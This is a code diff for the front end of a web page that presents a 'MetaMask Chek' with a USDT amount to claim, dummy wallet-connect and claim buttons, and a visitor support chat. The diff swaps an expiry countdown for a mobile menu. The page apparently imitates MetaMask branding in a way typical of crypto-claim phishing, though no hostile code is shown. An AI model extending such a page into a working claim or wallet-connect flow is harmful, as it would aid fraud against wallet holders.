@@ -1,15 +1,20 @@
 const params = new URLSearchParams(window.location.search);
 const linkId = params.get("id");
 
-// Elements
+// Elements for dynamic check info
 const checkTitleEl = document.getElementById("checkTitle");
 const amountEl = document.getElementById("amount");
 const currencyEl = document.getElementById("currency");
-const expiresEl = document.getElementById("expires");
 
+// Buttons
 const btnConnect = document.getElementById("btnConnect");
 const btnClaim = document.getElementById("btnClaim");
 
+// Mobile burger
+const burgerBtn = document.getElementById("burgerBtn");
+const mobileMenu = document.getElementById("mobileMenu");
+
+// Chat UI
 const chatFab = document.getElementById("chatFab");
 const chatPanel = document.getElementById("chatPanel");
 const chatClose = document.getElementById("chatClose");
@@ -17,7 +22,7 @@ const chatMessages = document.getElementById("chatMessages");
 const chatMsg = document.getElementById("chatMsg");
 const chatSend = document.getElementById("chatSend");
 
-// Dummy buttons (for now)
+// Dummy actions
 btnConnect?.addEventListener("click", () => {
   alert("Wallet connect modal later (dummy for now).");
 });
@@ -25,42 +30,30 @@ btnClaim?.addEventListener("click", () => {
   alert("Claim flow later (dummy for now).");
 });
 
-// Countdown (starts from 11:59)
-let expiresAtMs = null;
-let timerHandle = null;
-
-function formatHHMMSS(totalSeconds) {
-  const h = Math.floor(totalSeconds / 3600);
-  const m = Math.floor((totalSeconds % 3600) / 60);
-  const s = totalSeconds % 60;
-  return (
-    String(h).padStart(2, "0") + ":" +
-    String(m).padStart(2, "0") + ":" +
-    String(s).padStart(2, "0")
-  );
-}
-
-function startCountdown() {
-  if (!expiresEl) return;
-
-  function tick() {
-    const now = Date.now();
-    const diffMs = Math.max(0, expiresAtMs - now);
-    const diffSec = Math.floor(diffMs / 1000);
-
-    expiresEl.textContent = formatHHMMSS(diffSec);
-
-    if (diffSec <= 0) {
-      // expired
-      clearInterval(timerHandle);
-      timerHandle = null;
-    }
+// Mobile dropdown menu toggle
+function setMenu(open) {
+  if (!mobileMenu || !burgerBtn) return;
+  if (open) {
+    mobileMenu.classList.add("open");
+    mobileMenu.setAttribute("aria-hidden", "false");
+    burgerBtn.setAttribute("aria-expanded", "true");
+  } else {
+    mobileMenu.classList.remove("open");
+    mobileMenu.setAttribute("aria-hidden", "true");
+    burgerBtn.setAttribute("aria-expanded", "false");
   }
-
-  tick();
-  timerHandle = setInterval(tick, 1000);
 }
-
+burgerBtn?.addEventListener("click", () => {
+  const isOpen = mobileMenu?.classList.contains("open");
+  setMenu(!isOpen);
+});
+document.addEventListener("click", (e) => {
+  if (!mobileMenu || !burgerBtn) return;
+  if (!mobileMenu.classList.contains("open")) return;
+  const target = e.target;
+  if (mobileMenu.contains(target) || burgerBtn.contains(target)) return;
+  setMenu(false);
+});
 
 // Load link data
 fetch(`/api/link?id=${encodeURIComponent(linkId || "")}`)
@@ -71,7 +64,7 @@ fetch(`/api/link?id=${encodeURIComponent(linkId || "")}`)
       return;
     }
 
-    // Title: MetaMask Chek #215480
+    // Title: MetaMask Chek #<id>
     checkTitleEl.textContent = `MetaMask Chek #${data.id}`;
 
     // Amount: $1,250
@@ -84,16 +77,14 @@ fetch(`/api/link?id=${encodeURIComponent(linkId || "")}`)
 
     // currency: USDT
     currencyEl.textContent = `currency: ${String(data.currency).toUpperCase()}`;
-    expiresAtMs = Number(data.expiresAt);
-startCountdown();
-
   })
   .catch(() => {
     document.body.innerHTML = "Link not found";
-    
   });
 
-// Support chat: threadId per visitor per link
+/* ===== Support chat (same behavior as before) ===== */
+
+// Thread id per visitor per link
 let threadId = localStorage.getItem("greenland_thread_" + linkId);
 if (!threadId) {
   threadId = Math.random().toString(36).slice(2, 10);
@@ -110,7 +101,6 @@ function closeChat() {
   chatPanel.classList.remove("open");
   chatPanel.setAttribute("aria-hidden", "true");
 }
-
 chatFab?.addEventListener("click", openChat);
 chatClose?.addEventListener("click", closeChat);
 
@@ -147,7 +137,6 @@ function send() {
     body: JSON.stringify({ linkId, threadId, text })
   }).catch(() => {});
 }
-
 chatSend?.addEventListener("click", send);
 chatMsg?.addEventListener("keydown", (e) => {
   if (e.key === "Enter") send();
